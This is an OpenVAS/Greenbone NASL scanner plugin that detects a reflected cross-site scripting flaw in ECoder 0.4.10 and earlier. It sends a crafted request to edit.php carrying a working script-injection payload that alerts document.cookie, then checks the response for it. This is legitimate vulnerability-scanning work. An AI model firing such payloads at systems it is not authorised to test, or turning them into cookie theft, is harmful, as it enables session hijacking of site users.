# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902451");
  script_version("2024-05-07T05:05:33+0000");
  script_tag(name:"last_modification", value:"2024-05-07 05:05:33 +0000 (Tue, 07 May 2024)");
  script_tag(name:"creation_date", value:"2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("ECoder <= 0.4.10 Reflected XSS Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101231/ECoder0.4.10-XSS.txt");

  script_tag(name:"summary", value:"ECoder is prone to a reflected cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an input passed via the 'editor' parameter to
  the 'edit.php' script is not properly sanitised before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary
  script code in the browser of an unsuspecting user in the context of the affected site.");

  script_tag(name:"affected", value:"ECoder version 0.4.10 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

foreach dir(make_list_unique("/ecoder", "/demo", http_cgi_dirs(port:port))) {

  if(dir == "/")
    dir = "";

  res = http_get_cache(item:dir + "/", port:port);
  if("<title>ecoder</title>" >< res) {
    url = string(dir, '/edit.php?editor=&mode="><script>alert(document.cookie)</script>');
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "^HTTP/1\.[01] 200" && "><script>alert(document.cookie)</script>" >< res) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
